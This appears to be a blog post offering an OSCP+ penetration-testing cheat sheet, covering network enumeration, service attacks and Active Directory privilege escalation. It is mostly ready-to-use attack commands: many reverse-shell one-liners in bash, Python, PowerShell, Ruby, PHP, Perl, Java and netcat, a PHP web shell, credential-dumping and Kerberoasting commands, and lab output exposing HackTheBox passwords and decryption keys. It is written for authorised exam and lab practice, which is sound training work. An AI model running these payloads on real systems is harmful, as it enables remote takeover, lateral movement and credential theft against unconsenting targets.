---
title: "OSCP+ Cheat Sheet"
date: 2026-04-22 16:00:00 -0600
categories: [Offensive Security, OSCP+]
tags: [OSCP+]

image:
    path: /assets/img/samples/another/oscp_new.svg
    alt: OSCP
---

## Network

### Port Scan 

##### Automated Enumeration

##### TCP Scan

```shell
❯ nmap -p 1-65535 <ip>
```

##### UDP Scan 

```shell
❯ nmap -sU -p 1-65535  <ip>
```

##### Manual Enumeration

Bash:
```shell
for port in $(seq 1 65535); do timeout 1 bash -c "echo > /dev/tcp/<target-ip>/$port" 2>/dev/null && echo "port $port is open"; done
```

Powershell
```shell
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("<target-ip>",$_)) "Port $_ is open!"} 2>$null
```


### Host Discovery

...

##### Automated Discovery

```shell
netdiscover -i eth0
nmap -sn 10.10.0.1/24
```


##### Manual Discovery


Bash:
```shell
for i in {1..254}; do ping -c 1 -W 1 10.10.0.$i &>/dev/null && echo "Found <ip>$i"; done
```

Powershell
```shell
$ping = New-Object System.Net.Networkinformation.Ping ; 1..254 | % { $ping.send("10.10.0.$_", 1) | where status -ne 'TimedOut' | select Address | fl * }
```



### DNS Lookup

### OS Fingerprint


```shell
❯ ping -c 1 <ip>
```

TTL 128 = Windows
TTL 64 = Linux

```shell
nmap -O <ip>
```

## Reverse Shells

Bash
```shell
/bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1
bash -i >& /dev/tcp/<ip>/<port> 0>&1
sh -i >& /dev/tcp/<ip>/<port> 0>&1
/bin/sh -i >& /dev/tcp/<ip>/<port> 0>&1
bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
sh -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
bash -c 'sh -i >& /dev/tcp/<ip>/<port> 0>&1'
sh -c 'sh -i >& /dev/tcp/<ip>/<port> 0>&1'
/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'
bash -c '/bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1'
bash -c '/bin/sh -i >& /dev/tcp/<ip>/<port> 0>&1'
/bin/bash -c '/bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1'
/bin/bash -c '/bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1' #
/bin/bash -c '/bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1' ;
setsid /bin/bash -c '/bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1'
setsid /bin/bash -c '/bin/sh -i >& /dev/tcp/<ip>/<port> 0>&1'
setsid /bin/bash -c '/bin/sh -i >& /dev/tcp/<ip>/<port> 0>&1' #
setsid /bin/bash -c '/bin/sh -i >& /dev/tcp/<ip>/<port> 0>&1' ;
setsid /bin/sh -c '/bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1'
```

Python

```python
python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<ip>",<port>)); os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
```

Powershell

 
```shell
$sm=(New-Object Net.Sockets.TCPClient("10.10.17.1",1337)).GetStream(); [byte[]]$bt=0..255|%{0}; while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i); $st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1)); $sm.Write($st,0,$st.Length)}
```


```shell
$client = New-Object System.Net.Sockets.TCPClient('10.10.15.0',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```shell
$client = New-Object System.Net.Sockets.TCPClient('10.10.15.0', 1234)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | % { 0 }

while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (iex ". { $data } 2>&1" | Out-String)
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}

$client.Close()
```


Ruby 

```shell
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.17.1","1337"); while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end';
```

```shell
ruby -rsocket -e'f=TCPSocket.open("10.0.17.1",1337).to_i; exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

PHP
```shell
php -r '$sock=fsockopen("10.10.17.1",1337);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Java
```shell
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.17.1/1337;
cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

Perl 
```shell
perl -e 'use Socket;$i="10.10.17.1";$p=1337; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S"); open(STDOUT,">&S");open(STDERR,">&S"); exec("/bin/sh -i");};'
```
Netcat

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.1 1337 >/tmp/f
```


## Services

###  21/TCP - FTP

### 22/TCP - SSH

Principal Private Key Names
```shell
id-dsa
id-dsa-cert
id-dsa_cert
id-ecdsa
id-ecdsa-cert
id-ecdsa-sk
id-ecdsa-sk-cert
id-ecdsa-sk_cert
id-ecdsa_cert
id-ecdsa_sk
id-ecdsa_sk-cert
id-ecdsa_sk_cert
id-ed25519
id-ed25519-cert
id-ed25519-sk
id-ed25519-sk-cert
id-ed25519-sk_cert
id-ed25519_cert
id-ed25519_sk
id-ed25519_sk-cert
id-ed25519_sk_cert
id-rsa
id-rsa-cert
id-rsa_cert
id-xmss
id-xmss-cert
id-xmss_cert
id_dsa
id_dsa-cert
id_dsa_cert
id_ecdsa
id_ecdsa-cert
id_ecdsa-sk
id_ecdsa-sk-cert
id_ecdsa-sk_cert
id_ecdsa_cert
id_ecdsa_sk
id_ecdsa_sk-cert
id_ecdsa_sk_cert
id_ed25519
id_ed25519-cert
id_ed25519-sk
id_ed25519-sk-cert
id_ed25519-sk_cert
id_ed25519_cert
id_ed25519_sk
id_ed25519_sk-cert
id_ed25519_sk_cert
id_rsa
id_rsa-cert
id_rsa_cert
id_xmss
id_xmss-cert
id_xmss_cert
```

```shell
chmod 600 id_rsa
```


```shell
❯ ssh <user>@<ip> 
```

#### File Transfer

```shell
scp <file> <user>@<ip>:<remote-path>
```

#### File Download

```shell
scp <user>@<ip>:<remote-file-location> $(pwd)
```




### 25,465,587/TCP - SMTP


#### SMTP User Enumeration

```shell
❯ smtp-user-enum -M VRFY -U <users> -t <ip>
```



### 53/TCP|UDP - DNS

### 80/TCP - HTTP & 443/TCP - HTTPS

##### Web Shells

PHP
```shell
<?php system($_GET['cmd']); ?>
```


#### Directory Fuzzing

Principal Web-Content dictionaries from seclists:
```shell
/usr/share/seclists/Discovery/Web-Content/quickhits.txt
/usr/share/seclists/Discovery/Web-Content/common.txt

/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt

# APIs
/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
/usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt

# Web Server
/usr/share/seclists/Discovery/Web-Content/Web-Servers/IIS.txt
/usr/share/seclists/Discovery/Web-Content/Web-Servers/nginx.txt
/usr/share/seclists/Discovery/Web-Content/Web-Servers/Apache.txt
/usr/share/seclists/Discovery/Web-Content/Web-Servers/Apache-Tomcat.txt

# Programming Languages
/usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/Common-PHP-Filenames.txt
/usr/share/seclists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt

```


ffuf 

gobuster

dirbuster

dirsearch

feroxbuster
```shell
feroxbuster -u <url>
```


wfuzz


#### Subdomain Enumeration

Principal Subdomain dictionaries from seclists:
```shell
/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
/usr/share/seclists/Discovery/DNS/subdomains-spanish.txt
/usr/share/seclists/Discovery/DNS/services-names.txt
```


fuff 


wfuzz


gobuster


#### SQL Injection

#### Cross-Site Scripting (XSS)

#### Cross-site Request Forgery (CSRF)

#### Command Injection

#### Directory/Path Traversal

#### File Upload

#### Information Disclousure

#### Local File Inclusion

#### Remote File Inclusion

#### Server Side Template Injection

#### Server-side Request Forgery





### 88/TCP - Kerberos

#### Kerberos User Enumeration


```shell
❯ kerbrute userenum --dc <dc> -d <domain> <users>
```


#### Get TGT


impacket-getTGT
```shell
impacket-getTGT <domain>/<user>:<password> -dc-ip <dc-ip> -k
```


### 111,135,593/TCP - RPC

### 123/TCP - NTP

### 139,445/TCP - SMB

#### SMB Share Enumeration

```shell
❯ netexec smb <ip> -u <user> -p <password> --shares # Simple auth
❯ netexec smb <ip> -u guest -p '' --shares # Guest auth
❯ netexec smb <ip> -u '' -p '' --shares # Null auth
❯ netexec smb <ip> -u <user> -p <password> -k # Kerberos auth
```

#### SMB Users Enumeration

```shell
❯ netexec smb <ip> -u <user> -p <password> --users # Simple auth
❯ netexec smb <ip> -u guest -p '' --users # Guest auth
❯ netexec smb <ip> -u '' -p '' --users # Null auth
```

#### SMB Password Spraying

```shell
❯ NetExec smb <ip> -u <users> -p <passwords> --continue-on-success
```

#### Connect to SMB

smbclient
```
smbclient \\\\<ip>\\share -U <user>%<password> # Simple auth


smbclient \\\\<ip>\\share -U <domain>/<user>%<password> --realm=<domain> # Kerberos authentication
```

impacket-smbclient
```
impacket-smbclient <domain>/<user>:<password>@<ip> # Simple auth
impacket-smbclient <domain>/<user>:<password>@<ip> -k # Kerberos authentication
```





#### SMB RID Cycling

```shell
❯ netexec smb <ip> -u <user> -p <password> --rid-brute # Simple auth
❯ netexec smb <ip> -u guest -p '' --rid-brute # Guest auth
❯ netexec smb <ip> -u '' -p '' --rid-brute # Null auth
```

#### Download SMB Files

```shell
> get <file> 
```

netexec
```shell

```


#### Download Recursively SMB Share

smbclient
```shell
❯ smbclient \\\\<ip>\\<share> <user>%<password>
```

```shell
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> cd .
smb: \> lcd <local-path>
smb: \> mget *
```

netexec
```shell
❯ netexec smb <ip> -u <user> -p <password> -k --debug -M spider_plus -o DOWNLOAD_FLAG=True
```

#### Generate Hosts File over SMB

```shell
❯ NetExec smb <ip> --generate-hosts-file <outfile>
```

#### Generate KRB5 File over SMB

```shell
❯ netexec smb <ip> -u <user> -p <password> -k --generate-krb5-file krb5.conf
```

#### Get TGT over SMB
```shell
netexec smb <ip> -u <user> -p <password> --generate-tgt <outfile>
netexec smb <ip> -u <user> -p <password> -k --generate-tgt <outfile>
```

#### Pass-the-Ticket

```shell
impacket-getTGT <domain>/<user>:<password>@<ip> -k
```

```shell
impacket-smbclient <domain>/<user>:@<ip> -k -no-pass
```



#### Pass-The-Hash

```shell
❯ netexec smb <ip> -u <user> -H <nthash>
```

#### Abuse SMB Status Response


- **STATUS_PASS_MUST_CHANGE** 

- **STATUS_PASSWORD_EXPIRED**

```shell
❯ netexec smb <ip> -u <user> -p <oldpass> -M change-password -o USER=<user> NEWPASS=<newpass>
```

- **STATUS_ACCOUNT_DISABLED**

```shell
❯ bloodyAD --host <ip> -d <domain> -u <user> -p <password> remove uac <target-user> -f ACCOUNTDISABLE
```

```shell
❯ net rpc password <target-user> <newpass> -U <domain>/<user>%<password> -S <ip>
```




### 161,162/UDP - SNMP 

```shell
❯ snmpbulkwalk -v2c -c internal <ip>
❯ snmpbulkwalk -v2c -c internal <ip> | grep "STRING"
```

```shell
snmpbrute -t <ip>
```

### 389,636,3268,3269/TCP - LDAP

#### Enumerate all domain users
netexec
```shell
❯ netexec ldap <ip> -u <user> -p <password> --query "(sAMAccountName=*)" "" # Simple auth
❯ netexec ldap <ip> -u guest -p '' --query "(sAMAccountName=*)" "" # Guest auth
❯ netexec ldap <ip> -u '' -p '' --query "(sAMAccountName=*)" "" # Null auth
```

#### Retrieve the objectClass attribute

ldapsearch
```shell
❯ ldapsearch -H ldap://<ip> -x -b "DC=domain,DC=local"
```


### 2049/TCP - NFS

List shares
```shell
showmount -e <ip>
```

Mount share
```shell
mount -t nfs <ip>:/share /mnt/share
```

### 3389/TCP - RDP

Add user to `Remote Desktop Users` group.

**CMD**
```shell
C:\> net localgroup "Remote Desktop Users" <user> /add
```

**Powershell**
```shell
PS C:\> Add-LocalGroupMember -Group "Remote Desktop Users" -Member <user>
```


Simple auth
```shell
❯ xfreerdp /v:<ip> /u:<user> /p:<password>
```

Ignore Certificates
```shell
❯ xfreerdp /v:<ip> /u:<user> /p:<password> /cert-ignore
```

Pass-The-Hash
```shell
❯ xfreerdp /v:<ip> /u:<user> /pth:<nthash>
```
Dynamic resolution
```shell
❯ xfreerdp /v:<ip> /u:<user> /p:<password> /dynamic-resolution
```

![Desktop View](/assets/img/samples/another/rdpdynamicsize.png){: w="750" h="500"}

Better experience
```shell
xfreerdp /v:<ip> /u:<user> /p:<password> /d:<domain> /cert-ignore /f +clipboard /dynamic-resolution
```


### 5985,5986/TCP - WinRM

Add user to `Remote Management Users` group.

CMD
```shell
C:\> net localgroup "Remote Management Users" <user> /add
```

Powershell
```shell
PS C:\> Add-LocalGroupMember -Group "Remote Management Users" -Member <user>
```

#### Connect to WinRM

evil-winrm
```shell 
❯ evil-winrm -i <ip> -u <user> -p <password>
```

- File Upload and Download
```shell
*Evil-WinRM* PS C:\> upload <file>
*Evil-WinRM* PS C:\> download <file> <kali-filepath> # Kali Filepath Optional
```

**evil-wirnm-py** 
```shell
❯ evil-winrm-py -i <ip> -u <user> -p <password>
```


evil-winrm.rb
```shell
❯ ruby /var/lib/gems/3.3.0/gems/evil-winrm-3.7/evil-winrm.rb -i <ip> -u <domain>\\<user> -p <password>
```

Load powershell scripts Directory
```shell
❯ ruby /var/lib/gems/3.3.0/gems/evil-winrm-3.7/evil-winrm.rb -i <ip> -u <domain>\\<user> -s <directory> -p <password>
```

#### Authentication via Kerberos

``` shell
❯ impacket-getTGT 'voleur.htb'/'svc_winrm':'AFireInsidedeOzarctica980219afi' -dc-ip 10.129.232.130
Impacket v0.14.0.dev0+20260313.154148.084aff60 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_winrm.ccache
                                                                                                                                             
❯ export KRB5CCNAME=./svc_winrm.ccache
```

```shell
❯ ruby /var/lib/gems/3.3.0/gems/evil-winrm-3.7/evil-winrm.rb -i <dc> --realm <domain>
❯ evil-winrm -i <FQDN> --realm <domain> # Example: evil-winrm -i DC.labz.local --real labz.local
```



#### Pass-The-Hash

```shell
❯ evil-winrm -i <ip> -u <user> -H <nthash>
❯ evil-winrm-py -i <ip> -u <user> -H <nthash>
❯ ruby /var/lib/gems/3.3.0/gems/evil-winrm-3.7/evil-winrm.rb -i <ip> -u <domain>\\<user> -H <nthash>
```


# Linux

## Linux Post Exploitation

### TTY Treatment

**Bash**
```shell
victim@machine:~$ script /dev/null -c bash
^Z

❯ stty raw -echo; fg
		reset xterm
									
									
victim@machine:~$ export TERM=xterm
victim@machine:~$ export SHELL=bash
```

**Python**
```shell
victim@machine:~$ python -c 'import pty; pty.spawn("/bin/bash")'
^Z

❯ stty raw -echo; fg
		reset xterm
									
victim@machine:~$ export TERM=xterm
victim@machine:~$ export SHELL=bash
```

### Linux Privilege Escalation

#### Looking for Sensitive Information

#### Cron Jobs

#### Background Tasks

#### Abuse SUDOERS

Sudoers File Location: `/etc/sudoers`



```shell
$ sudo -l
```

Abuse

Native UNIX Programs: 
[GTFOBins](https://gtfobins.org/)


Structures:
```
(ALL)
(ALL:ALL)
(ALL:ALL) ALL
(ALL) NOPASSWD

(root)
(root:root)
(user)
(user:group)
```




#### Capabilities



```shell
$ getcap -r / 2>/dev/null
```

##### CAP_SETUID

##### 

##### 


##### 



#### Abuse Groups

##### lxc/lxd

##### video 

##### adm

##### disk

##### shadow

##### docker

##### wheel

##### root

#### SUID

```shell
$ find / -perm -4000 -ls 2>/dev/null
$ find / -perm -u=s -type f 2>/dev/null
```

#### Kernel Exploitation

```shell 
$ uname -vr
```

#### Abuse Weak File Permissions

#### Source Code Analysis

#### Library Hijacking




#### Automated Tools

# Windows

## Windows Post Exploitation

### Windows Privilege Escalation


#### Local Credential Dumping

#### SAM 

netexec
```shell
netexec smb <ip> -u <user> -p <password> --sam
```

#### LSA 

netexec
```shell
netexec smb <ip> -u <user> -p <password> --lsa
```


#### LSASS

netexec
```shell
netexec smb <ip> -u <user> -p <password> -M nanodump
```

#### Notepad


netexec
```shell
netexec smb <ip> -u <user> -p <password> -M notepad
netexec smb <ip> -u <user> -p <password> -M notepad++
```

#### Powershel History

##### Linux

netexec
```shell
netexec smb <ip> -u <user> -p <password> -M powershell_history
```

##### Windows

Principal Location

`C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`



#### Autologon Password

```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

#### DPAPI

Locations:

`C:\Users\steph.cooper\appdata\Roaming\Microsoft\Credentials`
`C:\Users\steph.cooper\appdata\Roaming\Microsoft\Protect`

```shell
❯ impacket-dpapi masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'
Impacket v0.14.0.dev0+20260313.154148.084aff60 - Copyright Fortra, LLC and its affiliated companies 

...

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

```shell
❯ impacket-dpapi credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
Impacket v0.14.0.dev0+20260313.154148.084aff60 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
...
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```

Practice lab: Puppy (HTB)


## Lateral Movement


#### SSH via private key

```shell
ssh -i id_rsa <user>@<ip>
```


### Linux Lateral Movement


### Windows Lateral Movement

#### Pivot User

```shell
PS C:\Temp> .\RunasCs.exe <user> <password> powershell -r <remote-ip>:443
[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-5ffff7$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 3012 created in background.
```

```shell
❯ rlwrap -cAr nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.15.46] from (UNKNOWN) [10.129.232.130] 62794
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32>
```


## Pivoting

chisel


ligolo-ng


ligolo-mp 

```shell
❯ sudo ligolo-mp server -laddr 0.0.0.0:11601
```

![Dekstop View](/assets/img/samples/another/ligolompinterface.png)



# Active Directory

## AD Attacks

### As-Rep Roasting

#### Make User AS-REP Roastable

**bloodyAD**:
```shell
❯ bloodyAD --host <ip> -d <domain> -u <user> -p <password> add uac <target-user> -f DONT_REQ_PREAUTH # Enable DONT_REQUIRE_PREAUTH 
❯ bloodyAD --host <ip> -d <domain> -u <user> -p <password> remove uac <target-user> -f DONT_REQ_PREAUTH # Disable DONT_REQUIRE_PREAUTH 
```

**ldap_shell**:
```shell
❯ ldap_shell <domain>/<user>:<password> -dc-ip <dc-ip>
```

```shell
user# set_dontreqpreauth <target-user> true # Enable DONT_REQUIRE_PREAUTH 
user# set_dontreqpreauth <target-user> false # Disable DONT_REQUIRE_PREAUTH 
```

**Graphic User Interface**

From the Active Directory interface (Active Directory Users and Computers (ADUC) > Account > User Properties):

![Desktop View](/assets/img/samples/another/asreproastgui.png){: w="400" h="250"}

#### Linux

**impacket-GetNPUsers**:

- Users dictionary
```shell
❯ impacket-GetNPUsers -dc-ip <dc-ip> -usersfile <users> <domain>/
```

- Target user
```shell
❯ impacket-GetNPUsers <domain>/<target-user> -dc-ip <dc-ip> -no-pass
```

**NetExec**:

- Users dictionary
```shell
❯ netexec ldap <dc-ip> -u <users> -p '' --asreproast <outfile>
```

- Target user
```shell
❯ netexec ldap <dc-ip> -u <target-user> -p '' --asreproast <outfile>
```

minikerberos-asreproast
```shell
❯ minikerberos-asreproast <dc-ip> <domain> <users>
```




#### Windows

Rubeus.exe

Targeted user
```shell
C:\> .\Rubeus64.exe asreproast /format:<target-user>
```


### Kerberoasting

#### Linux

impacket-GetUsersSPNs
```shell
❯ impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <dc-ip> -request
```

NetExec
```shell
❯ netexec ldap <dc-ip> -u <target-user> -p <password> --kerberoasting <outfile>
```

targetedKerberoast
```shell
❯ targetedKerberoast --dc-ip <dc-ip> -v -d <domain> -u <target-user> -p <password>
```

minikerberos-kerberoast

All users
```shell
❯ minikerberos-kerberoast 'kerberos+password://<domain>\<user>:<password>@<dc-ip>' <domain> <users>
```


Targeted user
```shell
❯ minikerberos-kerberoast 'kerberos+password://<domain>\<user>:<password>@<dc-ip>' <domain> <target-user>
```


#### Windows

Rubeus.exe
```shell
C:\>.\Rubeus64.exe kerberoast
```

Invoke-Kerberoast.ps1
```shell
PS C:\> Import-Module .\Invoke-Kerberoast.ps1
PS C:\> Invoke-Kerberoast
```


### Kerberoasting without Pre-Authentication

#### Linux

impacket-GetUserSPNs
```shell
❯ impacket-GetUserSPNs -no-preauth <user> -usersfile <users-dictionary> -dc-host <dc-ip> <domain>/
```

NetExec
```shell
❯ NetExec ldap <domain> -u '' -p '' --kerberoasting <outfile>
```


### DACLs 


#### AllExtendedRights

#### DCSync

#### ForgeChangePassword

**User -> User**

![Desktop View](/assets/img/samples/another/forcechangepassworduseroveruser.png){: w="1280" h="720"}

Pass-The-Hash
```shell
❯ pth-net rpc password <target-user> -U <domain>/<user>%"ffffffffffffffffffffffffffffffff":<nthash> -S <ip>
```
Plain Password
```shell
❯ net rpc password <target-user> <newpass> -U <domain>/<user>%<password> -S <ip>
```


#### GenericAll

**User -> Group**

```shell
❯ net rpc group addmem <target-group> <user> -U <domain>/<user>%<password> -S <ip>
```


**User -> User**

![Desktop View](/assets/img/samples/another/genericalluseroveruser.png){: w="700" h="500"}

Kerberoasting
```shell
❯ targetedKerberoast -v -d <domain> -u <owned_user> -p <password>
```

Change Password
```shell
❯ net rpc password <target-user> <new-password> -U <domain>/<user>%<password> -S <ip>
```


**User -> Domain Controller**

![Desktop View](/assets/img/samples/another/genericalluseroverdomaincontroller.png){: w="1280" h="720"}

Resource-based Constrained Deleagation
```shell
❯ NetExec ldap <ip> -u <user> -p <password> -M maq
```

```shell
❯ impacket-addcomputer -computer-name <fakecomputer>$ -computer-pass <computer-pass> -dc-ip <dc-ip> <domain>/<user>:<password>
```

```
❯ impacket-rbcd -delegate-to <target-dc>$ -delegate-from <fakecomputer>$ -dc-ip <dc-ip> -action write <domain>/<user>:<password>

```

```
❯ impacket-getST -spn cifs/<dc> -impersonate Administrator -dc-ip <dc-ip> <domain/<user>:<password>

```

```
❯ export KRB5CCNAME=./Administrator@cifs_dc.<domain@<DOMAIN>.ccache
```


```
❯ impacket-psexec <domain>/administrator@<dc-ip> -k -no-pass
```

#### GenericWrite

**User -> User**

![Desktop View](/assets/img/samples/another/genericwriteuseroveruser.png){: w="1280" h="720"}

Shadow Credential
```shell
❯ python3 /opt/HackTools/pywhisker/pywhisker/pywhisker.py -d "DC01.fluffy.htb" -u "p.agila" -p "prometheusx-303" --target "WINRM_SVC" --action "add"
```

```shell
❯ certipy-ad shadow auto -u 'p.agila' -p 'prometheusx-303' -dc-ip '10.129.56.209' -account 'winrm_svc'
```

Kerberoasting
```shell
❯ python3 /opt/HackTools/targetedKerberoast/targetedKerberoast.py -v -d 'administrator.htb' -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
```


#### AddSelf

**User -> Group**

```shell
❯ bloodyAD --host "10.129.55.161" -d "tombwatcher.htb" -u "Alfred" -p "basketball" add groupMember "Infrastructure" "Alfred"
```



#### WriteDacl

#### WriteOwner


#### WriteSPN






## AD Privilege Escalation

### AD Recycle Bin

Check AD Recycle Bin
```shell
PS C:\> Get-ADOptionalFeature 'Recycle Bin Feature'
```


```shell
PS C:\> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
```

Restore ADObject
```shell
PS C:\> Restore-ADObject -Identity <ObjectGUID>
```

### AD Credential Dumping

#### LAPS

##### Linux

netexec

```shell
netexec ldap <ip> -u <user> -p <password> -M laps
```


##### Windows

```shell
PS C:\> net user svc_deploy
User name                    svc_deploy
Full Name                    svc_deploy

...

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```

```shell
PS C:\> Get-ADComputer -Filter * -Properties 'ms-Mcs-AdmPwd' | Where-Object { $_.'ms-Mcs-AdmPwd' -ne $null }

DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-Mcs-AdmPwd     : PJFCpsjQaRcdJdY!YG$!v7S1
Name              : DC01
...
```
Practice lab: Timelaps (HTB), StreamIO (HTB)

#### NTDS.dit 

##### Linux

**netexec**
```shell
netexec smb <ip> -u <user> -p <password> --ntds
```



##### Windows

```shell
C:\programdata> diskshadow /s C:\programdata\backup
```


### Kali Linux Helpful Tools

```shell
/usr/bin/winpeas
/usr/bin/ncat-w32
/usr/bin/windows-resources
/usr/bin/apple-bleee
/usr/bin/exploitdb-papers
/usr/bin/jsp-file-browser
/usr/bin/sharpcollection
/usr/bin/laudanum
/usr/bin/powersploit
/usr/bin/htshells
/usr/bin/b374k
/usr/bin/mimikatz
/usr/bin/kerberoast
/usr/bin/sprayingtoolkit
/usr/bin/exploitdb
/usr/bin/rubeus
/usr/bin/exploitdb-bin-sploit
/usr/bin/ligolo-ng-common-binaries
/usr/bin/wce
/usr/bin/heartleech
/usr/bin/linpeas
/usr/bin/windows-binaries
/usr/bin/wordlists
/usr/bin/webshells
/usr/bin/nishang
/usr/bin/framework2
/usr/bin/wotmate
/usr/bin/windows-privesc-check
/usr/bin/peass
/usr/bin/pspy-binaries
/usr/bin/chisel-common-binaries
/usr/bin/seclists
/usr/bin/payloadsallthethings
```

**winpeas**

```shell
❯ winpeas

> peass ~ Privilege Escalation Awesome Scripts SUITE

/usr/share/peass/winpeas
├── winPEAS.bat
├── winPEAS.ps1
├── winPEASany.exe
├── winPEASany_ofs.exe
├── winPEASx64.exe
├── winPEASx64_ofs.exe
├── winPEASx86.exe
└── winPEASx86_ofs.exe
```

**linpeas**
```shell
❯ linpeas

> peass ~ Privilege Escalation Awesome Scripts SUITE

/usr/share/peass/linpeas
├── linpeas.sh
├── linpeas_darwin_amd64
├── linpeas_darwin_arm64
├── linpeas_fat.sh
├── linpeas_linux_386
├── linpeas_linux_amd64
├── linpeas_linux_arm
├── linpeas_linux_arm64
└── linpeas_small.sh
```

**mimikatz**

```shell
❯ mimikatz

> mimikatz ~ Uses admin rights on Windows to display passwords in plaintext

/usr/share/windows-resources/mimikatz
├── Win32
│   ├── mimidrv.sys
│   ├── mimikatz.exe
│   ├── mimilib.dll
│   ├── mimilove.exe
│   └── mimispool.dll
├── kiwi_passwords.yar
├── mimicom.idl
└── x64
    ├── mimidrv.sys
    ├── mimikatz.exe
    ├── mimilib.dll
    └── mimispool.dll
```

**pspy-binaries**
```shell
❯ pspy-binaries

> pspy ~ Monitor Linux processes without root permissions

/usr/share/pspy
├── pspy32
├── pspy32s
├── pspy64
└── pspy64s
```

**kerberoast**
```shell
❯ kerberoast

> kerberoast ~ tools for attacking MS Kerberos implementations

/usr/share/kerberoast
├── GetUserSPNs.ps1
├── GetUserSPNs.vbs
├── extracttgsrepfrompcap.py
├── kerberoast.py
├── kerberos.py
├── kirbi2john.py
├── krbroast-pcap2hashcat.py
├── pac.py
└── tgsrepcrack.py
```

**webshells**
```shell
❯ webshells

> webshells ~ Collection of webshells

/usr/share/webshells
├── asp
├── aspx
├── cfm
├── jsp
├── laudanum -> /usr/share/laudanum
├── perl
└── php
```

Machines that I practice on:

**HackTheBox**

Stand Alone Machines

- Access (Easy)
- Help (Easy)
- Networked (Easy)
- Poison (Medium)
- Jarvis (Medium)
- Sniper (Medium)
- Arctic (Easy)
- ServMon (Easy)
- SecNotes (Medium)
- Magic (Medium)
- Intelligence (Medium)
- Jeeves (Medium)
- Love (Easy)
- Precious (Easy)
- Devvortex (Easy)
- TarTarSauce (Medium)
- Bashed (Easy)
- Sunday (Easy)
- Popcorn (Medium)
- Pandora (Easy)
- Irked (Easy)
